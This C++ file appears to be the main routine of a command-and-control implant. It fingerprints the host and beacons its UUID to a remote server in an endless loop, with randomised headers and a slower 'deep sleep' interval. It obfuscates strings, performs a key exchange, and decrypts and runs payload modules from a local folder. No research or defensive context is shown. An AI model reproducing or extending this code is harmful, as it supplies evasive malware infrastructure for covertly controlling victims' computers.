#include "Loader.h"
#include "Fingerprint.h"
#include "Globals.h"
#include "KeyExchange.h"
#include <iostream>
#include <thread>
#include "Obfuscation.h"
#include <chrono>
#include <curl/curl.h>

static size_t write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}

static void heartbeat(const std::string& server) {
    CURL* curl = curl_easy_init();
    if(!curl) return;
    g_header_randomizer.apply(curl);
    while(true) {
        std::string url = server + g_agent_config.path_prefix + OBFUSCATE("/heartbeat");
        std::string payload = "{\"uuid\":\"" + g_uuid + "\"}";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_perform(curl);
        auto interval = g_deep_sleep.load() ? std::chrono::hours(1) : std::chrono::minutes(1);
        std::this_thread::sleep_for(interval);
    }
    curl_easy_cleanup(curl);
}

int main() {
    auto fp = collect_fingerprint();
    g_uuid = fp.uuid;
    std::thread hb(heartbeat, g_agent_config.server_url);
    hb.detach();

    Loader clearLoader(OBFUSCATE("./plugins"), "");
    clearLoader.load();
    std::string aes_key;
    for (const auto& mod : clearLoader.modules()) {
        if(g_safe_mode.load() || g_deep_sleep.load()) break;
        if(mod->name() == "KeyExchange") {
            mod->init();
            auto kx = dynamic_cast<KeyExchange*>(mod.get());
            if(kx) aes_key = kx->aes_key();
        } else {
            mod->init();
        }
    }

    Loader encLoader(OBFUSCATE("./payloads"), aes_key);
    encLoader.load();
    for (const auto& mod : encLoader.modules()) {
        if(g_safe_mode.load() || g_deep_sleep.load()) break;
        mod->init();
    }
    while(!g_safe_mode.load() && !g_deep_sleep.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    // safe mode or deep sleep active; keep heartbeat alive
    while(g_deep_sleep.load()) {
        std::this_thread::sleep_for(std::chrono::hours(1));
    }
    return 0;
}
